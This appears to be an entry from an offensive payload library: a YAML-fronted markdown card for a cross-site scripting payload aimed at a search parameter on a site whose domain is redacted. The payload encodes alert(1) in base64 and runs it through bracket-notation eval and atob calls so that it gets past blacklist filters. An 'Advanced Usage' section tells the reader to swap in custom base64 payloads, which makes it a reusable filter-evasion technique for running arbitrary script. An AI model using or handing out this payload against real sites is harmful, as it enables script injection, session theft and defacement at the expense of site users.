---
id: cmd-uuid-3
data: >-
  www.███/News/Speeches?Search={{window['eval'](window['atob'](window['decodeURIComponent']('YWxlcnQoMSk=')))}}
name: bypass-blacklist-base64-alert
tags:
  - xss-bypass
type: command
output: Browser alert box with '1'
executor: browser
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:16:08.250Z'
verified: false
validated: true
submitted: true
---
# bypass-blacklist-base64-alert

## Command

```bash
# Browser URL: www.███/News/Speeches?Search={{window['eval'](window['atob'](window['decodeURIComponent']('YWxlcnQoMSk=')))}}
```

## Description

This command bypasses blacklists by base64-encoding alert(1) and decoding/executing it via safe window methods in the template.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| Search | Encoded chain with base64 payload | Yes |

## Examples

### Basic Usage

```bash
www.███/News/Speeches?Search={{window['eval'](window['atob'](window['decodeURIComponent']('YWxlcnQoMSk=')))}}
```

### Advanced Usage

Replace base64 for custom payloads.

```bash
www.███/News/Speeches?Search={{window['eval'](window['atob'](window['decodeURIComponent']('CUSTOM_BASE64')))}}
```

## Expected Output

An alert box displays '1', confirming successful JS execution.

## Related

- [[Related Procedure: Bypass-Blacklist-with-Base64-Encoding]]
